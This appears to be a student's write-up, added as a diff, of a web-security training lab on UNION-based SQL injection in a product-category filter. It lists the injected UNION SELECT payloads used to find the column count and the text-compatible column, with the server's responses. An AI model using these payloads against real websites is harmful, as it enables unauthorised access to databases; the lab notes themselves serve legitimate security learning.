@@ -1,0 +1,27 @@
+LAB DESCRIPTION
+SQLi in product category. Result from stored in app's response
+
+GOAL
+
+Make the database retrieve the string: 'DfZaHS'
+
+PREREQUISITE
+Rule: The no + order of col should be same in a query. Data type must be compatible
+
+ANALYSIS
+
+# Determine no of cols
+' UNION SELECT NULL--
+    <internal server error>
+' UNION SELECT NULL, NULL--
+    <internal server error>
+' UNION SELECT NULL, NULL, NULL--
+    got the product page as before
+so the no of cols = 3
+# Retreive the string
+' UNION SELECT 'a', NULL, NULL--
+Internal Server Error
+' UNION SELECT NULL, 'a', NULL--
+<retrieved 'a'>
+' UNION SELECT NULL, NULL, 'a'--
+Internal Server Error
